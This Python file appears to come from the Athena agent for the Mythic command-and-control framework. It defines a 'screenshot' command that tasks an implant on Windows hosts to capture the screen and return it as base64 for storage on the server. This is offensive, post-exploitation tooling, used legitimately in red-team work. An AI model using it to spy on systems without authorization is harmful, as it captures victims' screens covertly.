from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *


class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Tasks Athena to take a screenshot and returns as base64."
    version = 1
    supported_ui_features = []
    is_exit = False
    author = "@tr41nwr3ck"
    attackmapping = []
    argument_class = ScreenshotArguments
    attributes = CommandAttributes(
        load_only=False,
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )
    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.completed_callback_function = self.screenshot_completed
        return task

    async def process_response(self, response: AgentResponse):
            file_resp = await MythicRPC().execute("create_file",
                                    task_id=response.task.id,
                                    file=response.response,
                                    delete_after_fetch=False,
                                    is_screenshot=True)  
    pass
    async def screenshot_completed(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        if task.completed and task.status != MythicStatus.Error:
            responses = await MythicRPC().execute(
                "get_responses",
                task_id=task.id,
            )
            if responses.status != MythicStatus.Success:
                raise Exception("Failed to get responses from task")
            file_id = ""
            for f in responses.response["files"]:
                if "agent_file_id" in f.keys() and f["agent_file_id"] != "" and f["agent_file_id"] != None:
                    file_id = f["agent_file_id"]
                    break
            if file_id == "":
                raise Exception("Screenshot completed successfully, but no files had an agent_file_id")
            else:
                resp = await MythicRPC().execute(
                    "create_output",
                    task_id=task.id,
                    output=file_id)
                if resp.status != MythicStatus.Success:
                    raise Exception("Failed to create output")
        return task
